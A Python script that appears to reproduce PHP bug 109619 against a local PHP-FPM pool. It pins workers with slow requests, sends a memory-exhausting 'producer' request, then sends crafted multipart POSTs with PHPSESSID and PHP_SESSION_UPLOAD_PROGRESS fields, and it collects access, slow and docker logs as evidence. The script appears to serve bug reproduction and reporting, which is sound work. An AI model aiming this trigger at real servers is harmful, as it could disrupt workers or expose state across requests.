#!/usr/bin/env python3
"""109619 producer -> consumer pair on one FPM worker (stock dynamic pool).

Pins max_children-1 workers with slow requests, sends the producer, then the
consumer with a small multipart body (PHPSESSID before PHP_SESSION_UPLOAD_PROGRESS).
Prints PIDs from the FPM access log and the FPM error log delta.
"""
import argparse, json, os, socket, subprocess, sys, threading, time

D = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOGS = os.path.join(D, "logs")

def http(url, method="GET", body=b"", ctype="", timeout=90, chunked=False, extra=""):
    import urllib.parse
    u = urllib.parse.urlsplit(url)
    host, port = u.hostname, u.port
    path = u.path + ("?" + u.query if u.query else "")
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    hdr = "%s %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n" % (method, path, host, port)
    if ctype:
        hdr += "Content-Type: %s\r\n" % ctype
    if chunked:
        hdr += "Transfer-Encoding: chunked\r\n"
    elif body:
        hdr += "Content-Length: %d\r\n" % len(body)
    hdr += extra + "\r\n"
    out = bytearray()
    try:
        s.sendall(hdr.encode() + body)
        while True:
            c = s.recv(65536)
            if not c:
                break
            out += c
    except (socket.timeout, OSError):
        pass
    s.close()
    return bytes(out)

def status(resp):
    try:
        return int(resp.split(b" ")[1])
    except Exception:
        return 0

def body_after_headers(resp):
    i = resp.find(b"\r\n\r\n")
    return resp[i+4:] if i >= 0 else resp

def consumer_body(sid, key="bgupload", pad=b"", bnd="----bgBoundary7MA4YWxkTrZu0gW"):
    parts = []
    def field(name, value):
        parts.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n" % (bnd, name)).encode())
        parts.append(value if isinstance(value, bytes) else value.encode())
        parts.append(b"\r\n")
    field("PHPSESSID", sid)
    field("PHP_SESSION_UPLOAD_PROGRESS", key)
    if pad:
        field("pad", pad)
    parts.append(("--%s\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\nContent-Type: text/plain\r\n\r\n" % bnd).encode())
    parts.append(b"A")
    parts.append(("\r\n--%s--\r\n" % bnd).encode())
    return b"".join(parts)

def read_log(path):
    try:
        return open(path, "rb").read().decode("latin1")
    except OSError:
        return ""

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ver", required=True)
    ap.add_argument("--web-port", type=int, required=True)
    ap.add_argument("--container", default="")
    ap.add_argument("--sid", default="s1")
    ap.add_argument("--sess-content", default='p|s:5:"hello";')
    ap.add_argument("--producer", default="/producer_oom.php?n=8000000")
    ap.add_argument("--consumer-path", default="/consumer.php")
    ap.add_argument("--pad", type=int, default=0)
    ap.add_argument("--pins", type=int, default=4)
    ap.add_argument("--pin-secs", type=int, default=8)
    ap.add_argument("--n", type=int, default=1, help="number of consecutive consumers")
    ap.add_argument("--outdir", default="")
    args = ap.parse_args()
    outdir = args.outdir or os.path.join(D, "evidence", "pair-%s-%s" % (args.ver, time.strftime("%H%M%S")))
    os.makedirs(outdir, exist_ok=True)
    logdir = os.path.join(LOGS, "fpm-" + args.ver)
    acc = os.path.join(logdir, "access.log")
    errlog = os.path.join(logdir, "slow.log")

    # session file inside the container
    if args.container:
        subprocess.run(["docker", "exec", args.container, "sh", "-c",
                        "printf '%s' > /tmp/sess_%s" % (args.sess_content.replace("'", "'\\''"), args.sid)],
                       check=False)
    else:
        open("/tmp/sess_" + args.sid, "w").write(args.sess_content)

    before_acc = read_log(acc)
    err_before = len(read_log(errlog))

    pins = []
    def pin():
        try:
            http("http://127.0.0.1:%d/slow.php?s=%d" % (args.web_port, args.pin_secs), timeout=args.pin_secs + 20)
        except Exception:
            pass
    for _ in range(args.pins):
        t = threading.Thread(target=pin, daemon=True); t.start(); pins.append(t)
    time.sleep(2.0)

    t0 = time.time()
    presp = http("http://127.0.0.1:%d%s" % (args.web_port, args.producer), timeout=120)
    time.sleep(0.1)
    results = []
    for i in range(args.n):
        pad = b"P" * args.pad if args.pad else b""
        body = consumer_body(args.sid, pad=pad)
        open(os.path.join(outdir, "consumer%d.raw" % i), "wb").write(body)
        cresp = http("http://127.0.0.1:%d%s" % (args.web_port, args.consumer_path), "POST", body,
                     "multipart/form-data; boundary=----bgBoundary7MA4YWxkTrZu0gW", timeout=60)
        open(os.path.join(outdir, "consumer%d.resp" % i), "wb").write(cresp)
        results.append({"i": i, "status": status(cresp), "body": body_after_headers(cresp)[:200].decode("latin1", "replace")})
        time.sleep(0.1)

    acc_delta = read_log(acc)[len(before_acc):]
    err_delta = read_log(errlog)[err_before:]
    summary = {
        "ver": args.ver, "producer_status": status(presp),
        "producer_body": body_after_headers(presp)[:200].decode("latin1", "replace"),
        "consumer": results,
        "access_delta": acc_delta.strip().splitlines()[-12:],
        "slowlog_delta": err_delta.strip().splitlines()[-12:],
        "elapsed": round(time.time() - t0, 3),
    }
    # also capture docker logs (worker exit messages)
    if args.container:
        r = subprocess.run(["docker", "logs", "--since", "30s", args.container],
                           capture_output=True, text=True)
        summary["docker_logs"] = r.stderr.strip().splitlines()[-12:] + r.stdout.strip().splitlines()[-12:]
    json.dump(summary, open(os.path.join(outdir, "summary.json"), "w"), indent=1)
    print(json.dumps(summary, indent=1))
    for t in pins:
        t.join(timeout=1)

if __name__ == "__main__":
    main()
